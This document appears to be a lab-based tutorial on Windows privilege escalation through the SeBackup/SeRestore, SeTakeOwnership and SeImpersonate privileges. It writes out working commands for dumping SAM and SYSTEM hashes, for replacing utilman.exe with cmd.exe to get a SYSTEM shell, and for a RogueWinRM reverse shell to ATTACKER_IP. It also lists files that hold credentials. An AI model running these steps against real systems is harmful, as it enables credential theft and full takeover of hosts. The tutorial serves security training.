# **Abusing dangerous privileges - Windows Privilege Escalation**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/622cad3d-d7d0-458d-8009-3b82ea044286)

**In the realm of Windows security, certain privileges wield considerable power, capable of exerting control over critical system functions. These are what we refer to as "Dangerous Privileges." These elevated permissions, when misused or exploited, pose significant risks to the overall integrity and security of the operating system. Here is a Practical Breakdown on How Certain privileges in Windows could lead to Unauthorized Access**

***


- Run this command to check for privileges


```
whoami /priv
```

- Note that only those privileges that allow us to escalate in the system are of interest.


## **SeBackup / SeRestore**


![](https://i.imgur.com/y9LrrrW.png)





- With this privilege, we can backup the SAM and SYSTEM hashes, we can use the following commands:


```
reg save hklm\system C:\Users\THMBackup\system.hive

reg save hklm\sam C:\Users\THMBackup\sam.hive
```


- Now go ahead and send this 2 files to our attacker machine using any method you like



![](https://i.imgur.com/RrsUzEY.png)



- And use `impacket-secretsdump` to retrieve the users' password hashes:



```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```




![](https://i.imgur.com/HZUGMA0.png)


- We can then use pass the hash to login


![](https://i.imgur.com/7xIilg8.png)




## **SeTakeOwnership**



![](https://i.imgur.com/Y2z3mob.png)



- We can then abuse `utilman.exe`, a built-in Windows application used to provide Ease of Access options during the lock screen


![](https://i.imgur.com/MS2BtF5.png)



- To replace `utilman`, we will start by taking ownership of it with the following command:


```
takeown /f C:\Windows\System32\Utilman.exe
```


- Then give your current user full permissions over `utilman.exe` you can use the following command:



```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```




**_Example_**



![](https://i.imgur.com/YFNbx3T.png)



- After this, we will replace `utilman.exe` with a copy of `cmd.exe`:




```
copy cmd.exe utilman.exe
```



- To trigger `utilman`, we will lock our screen from the start button
- proceed to click on the **"Ease of Access"** button, which runs `utilman.exe` with `SYSTEM` privileges. Since we replaced it with a `cmd.exe` copy.



![](https://i.imgur.com/oeLERDx.png)


### **Extra**

Use this with files that might contain credentials such as

- `%WINDIR%\repair\sam`
- `%WINDIR%\repair\system`
- `%WINDIR%\repair\software`
- `%WINDIR%\repair\security`
- `%WINDIR%\system32\config\security.sav`
- `%WINDIR%\system32\config\software.sav`
- `%WINDIR%\system32\config\system.sav`
- `%WINDIR%\system32\config\SecEvent.Evt`
- `%WINDIR%\system32\config\default.sav`
- `c:\inetpub\wwwwroot\web.config`



## **SeImpersonate / SeAssignPrimaryToken**


- These privileges allow a process to impersonate other users and act on their behalf.


![](https://i.imgur.com/Ztfr87a.png)



- Start a netcat listener to receive a reverse shell on our attacker's machine:


```bash
nc -lvnp 4444
```



- And then, use our web shell to trigger the `RogueWinRM` exploit using the following command
- Make sure to transfer [win-netcat](https://github.com/sec-fortress/Exploits/blob/main/nc64.exe) and [RogueWinRM](https://github.com/sec-fortress/Exploits/blob/main/RogueWinRM.exe) to target machine
- Also note that the `RogueWinRM` file stated earlier might not work, so download from [here](https://github.com/antonioCoco/RogueWinRM) and compile in the windows machine


```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4444"
```



![](https://i.imgur.com/EGtIOIr.png)


That will be all for today, Have Fun 🥳🙏


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>





